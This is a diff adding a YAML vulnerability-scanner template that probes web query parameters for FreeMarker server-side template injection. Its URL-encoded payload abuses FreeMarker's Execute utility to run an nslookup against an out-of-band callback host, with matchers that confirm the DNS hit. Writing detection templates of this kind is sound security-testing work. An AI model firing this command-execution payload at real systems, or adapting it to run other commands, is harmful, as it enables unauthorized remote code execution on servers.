@@ -1,0 +1,38 @@
+id: freemarker-oob
+
+info:
+  name: Freemarker 2.3.33 - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
+  reference:
+    - https://mvnrepository.com/artifact/org.freemarker/freemarker
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "%3c%23assign%20rce%3d%22freemarker.template.utility.Execute%22%3fnew()%3e%20%0d%0a%24%7b%20rce(%22nslookup%20-type=SRV%20{{interactsh-url}}%22)%20%7d"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022100a550b9da7bb907e0f69ada12ec0a8917b3a05ef91a1ffb981e3444d6be9a673802201f3705a33be6e83c9152738de01752e44507ea21498b52351c78772993f17339:922c64590222798bb761d5b6d8e72950
